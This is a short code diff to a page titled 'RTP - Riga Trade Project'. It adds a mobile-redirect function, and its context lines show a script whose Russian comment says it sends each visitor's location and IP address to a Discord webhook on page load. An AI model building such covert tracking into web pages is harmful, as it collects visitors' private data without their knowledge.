@@ -5,6 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RTP - Riga Trade Project</title>
     <script>
+        // Функция для проверки устройства пользователя и перенаправления на другую страницу
+        function checkDeviceAndRedirect() {
+            // Проверяем, является ли устройство мобильным
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // Если да, перенаправляем на indexp.html
+                window.location.href = "indexp.html";
+            }
+        }
+    </script>
+    <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Функция отправки местоположения и IP адреса на вебхук Discord
             async function sendDataToWebhook() {
@@ -62,7 +72,6 @@
         .exchange-text {
             margin-top: 10px; /* Добавили верхний отступ для текста */
         }
-
     </style>
 </head>
 <body>
